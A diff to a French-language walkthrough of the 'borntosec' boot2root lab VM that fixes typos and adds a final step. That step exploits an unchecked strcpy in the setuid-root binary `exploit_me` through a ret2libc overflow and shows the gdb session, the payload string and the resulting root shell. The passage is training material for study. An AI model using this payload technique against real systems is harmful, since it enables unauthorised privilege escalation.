@@ -19,7 +19,7 @@ vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
 
 L'interface `vboxnet0` est celle créée par VirtualBox, elle contient toutes les informations néssecaires pour trouver l'ip de la VM.
 
-Nous savons à présent que l'addresse du réseau est `192.168.56.0/24`,
+Nous savons à présent que l'adresse du réseau est `192.168.56.0/24`,
 maintenant que nous avons cette adresse nous pouvons lister toutes les machines appartennants au réseau avec `nmap`
 
 En tapant la commande `nmap 192.168.56.0-255`, nous obtenons ce résultat:
@@ -50,7 +50,7 @@ PORT    STATE SERVICE
 443/tcp open  https
 993/tcp open  imaps
 
-Nmap done: 256 IP addresses (3 hosts up) scanned in 5.43 seconds
+Nmap done: 256 IP adresses (3 hosts up) scanned in 5.43 seconds
 ```
 
 Nous savons que l'ip `192.168.56.1` est celle de VirtualBox, donc l'ip de la VM est `192.168.56.101`.
@@ -154,7 +154,7 @@ Une fois connecté nous avons la liste des utilisateurs possible et la possibili
 
 ![change_infos_lmezard_forum](assets/change_infos_lmezard_forum.png)
 
-L'utilisateur `lmezard` ne peut pas faire grand chose de plus que cela, mais en nous rendant dans ses informations nous pouvons nous rendre compte que son addresse email est `laurie@borntosec.net` avec son email nous devrions avoir accès à son compte Webmail...
+L'utilisateur `lmezard` ne peut pas faire grand chose de plus que cela, mais en nous rendant dans ses informations nous pouvons nous rendre compte que son adresse email est `laurie@borntosec.net` avec son email nous devrions avoir accès à son compte Webmail...
 
 ## Étape 4 - Webmail:
 
@@ -257,13 +257,13 @@ ftp> get README
 local: README remote: README
 229 Entering Extended Passive Mode (|||49046|).
 150 Opening BINARY mode data connection for README (96 bytes).
-100% |******************************************************************************************************************************************************************************************************************|    96      732.42 KiB/s    00:00 ETA226 Transfer complete.
+100% |****************************************************************************************|    96      732.42 KiB/s    00:00 ETA226 Transfer complete.
 96 bytes received in 00:00 (252.01 KiB/s)
 ftp> get fun
 local: fun remote: fun
 229 Entering Extended Passive Mode (|||65455|).
 150 Opening BINARY mode data connection for fun (808960 bytes).
-100% |******************************************************************************************************************************************************************************************************************|   790 KiB  156.96 MiB/s    00:00 ETA226 Transfer complete.
+100% |****************************************************************************************|   790 KiB  156.96 MiB/s    00:00 ETA226 Transfer complete.
 808960 bytes received in 00:00 (143.42 MiB/s)
 ftp> exit
 221 Goodbye.
@@ -420,7 +420,7 @@ o
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
 
-L'éxecutable `bomb` est un nouveau jeu de piste ou nous devons trouver six réponse pour résoudre résoudre la bomb.
+L'éxecutable `bomb` est un nouveau jeu de piste ou nous devons trouver six réponse pour résoudre la bomb.
 
 Pour trouver les solutions au six phases de la bomb nous l'avons désasemblée avec [ghidra](https://ghidra-sre.org/).
 
@@ -492,3 +492,101 @@ Voici donc les nouveaux identifiats, ceux de `zaz - 646da671ca01bb5d84dbb5fb2238
 
 ## Étape 9 - Ssh via zaz:
 
+On trouve un binaire `exploit_me` et un dossier mail.
+
+Après avoir cherché dans le dossier mail sans rien trouver, on s'est concentré sur le binaire `exploit_me`. On a copié le binaire sur le mac pour pouvoir le décompliler avec [ghidra](https://ghidra-sre.org/). On a pu voir dans le main une utilisation de la fonction strcpy qui n'était pas protegée.
+
+Avant d'essayer d'exploiter le buffer overflow du binaire, nous avons verifié que l'`ASLR` (address space layout randomization), une proctetion système qui attribue des adresses mémoire random à chaque exécution d'un binaire, ne soit pas activée sur le serveur.
+
+```sh
+#> cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+Pour que la fail du strcpy puissent nous donner les accèss à root nous devons verifier aussi que le binaires appartient à l'utilisateur root.
+
+```sh
+#> ls -la exploit_me
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 exploit_me
+```
+
+Le binaire a donc bien les droits d'exécution root, la faille que nous allons essayer d'exploiter pourrais nous donner les droits root.
+
+Ce que nous allons essayer de faire est de lancer un terminal via la fonction system de la libc en écrivant sur l'overflow (au delà de 140 chars) l'adresse de cette fonction et l'adresse de la variable d'environnement shell que l'on veut exécuter. Cela va nous permettre d'avoir un terminal avec accès root car le binaire qui lance ce terminal a l'accès root.
+
+On a remarqué que le programme avait un segfault quand on lui envoyait une chaine de plus de 140 caractères. On a lancé le binaire avec `GDB` et on a mis un break point pour trouver l'adresse de la fonction `system` et de la variable d'environement `SHELL`.
+
+```sh
+#> gdb -q exploit_me
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:	push   %ebp
+   0x080483f5 <+1>:	mov    %esp,%ebp
+   0x080483f7 <+3>:	and    $0xfffffff0,%esp
+   0x080483fa <+6>:	sub    $0x90,%esp
+   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:	jg     0x804840d <main+25>
+   0x08048406 <+18>:	mov    $0x1,%eax
+   0x0804840b <+23>:	jmp    0x8048436 <main+66>
+   0x0804840d <+25>:	mov    0xc(%ebp),%eax
+   0x08048410 <+28>:	add    $0x4,%eax
+   0x08048413 <+31>:	mov    (%eax),%eax
+   0x08048415 <+33>:	mov    %eax,0x4(%esp)
+   0x08048419 <+37>:	lea    0x10(%esp),%eax
+   0x0804841d <+41>:	mov    %eax,(%esp)
+   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:	lea    0x10(%esp),%eax
+   0x08048429 <+53>:	mov    %eax,(%esp)
+   0x0804842c <+56>:	call   0x8048310 <puts@plt>
+   0x08048431 <+61>:	mov    $0x0,%eax
+   0x08048436 <+66>:	leave
+   0x08048437 <+67>:	ret
+End of assembler dump.
+(gdb) break *0x08048425
+Breakpoint 1 at 0x8048425
+(gdb) r $(python -c 'print "a"*142')
+Starting program: /home/zaz/exploit_me $(python -c 'print "a"*142')
+
+Breakpoint 1, 0x08048425 in main ()
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+(gdb) x/500s $esp
+0xbffff5e0:	 "\360\365\377\277^\370\377\277\001"
+0xbffff5ec:	 "I<\354\267", 'a' <repeats 142 times>
+[...]
+0xbffff849:	 "/home/zaz/exploit_me"
+0xbffff85e:	 'a' <repeats 142 times>
+0xbffff8ed:	 "SHELL=/bin/bash"
+0xbffff8fd:	 "TERM=xterm-256color"
+0xbffff911:	 "SSH_CLIENT=192.168.56.1 49382 22"
+0xbffff932:	 "SSH_TTY=/dev/pts/0"
+0xbffff945:	 "USER=zaz"
+[...]
+```
+
+Dans le retour de gdb nous avons toutes les informations pour procéder à l'exploitation du binaire.
+
+Les lignes suivantes contienents les adresses mémoires que nous pouvons utiliser pour exploiter le binaire, `0xb7e6b060` pour la fonction system et `0xbffff8ed` pour la variable d'environement.
+
+ * `$1 = {<text variable, no debug info>} 0xb7e6b060 <system>` pour la fonction `system`
+
+ * `0xbffff8ed:	 "SHELL=/bin/bash"` pour la variable d'environnement `SHELL`
+
+On lance alors le binaire avec la chaine preparé pour exploiter la faille de sécurité et ouvrir un shell avec les droits root.
+
+```sh
+./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'OSEF' + '\x58\xcc\xf8\xb7')"`
+```
+
+Cette chaine écris 140 `0` pour remplir le buffer et, sur l'overflow, l'adresse de la fonction system, le return de la fonction et l'adresse du shell passé en paramètre.
+
+```sh
+zaz:#> ./exploit_me `python -c "print('0' * 140 + '\x60\xb0\xe6\xb7' + 'OSEF' + '\x58\xcc\xf8\xb7')"`
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000`��OSEFX��
+#> whoami
+root
+#>
+```
+
+`Youpi on est root`
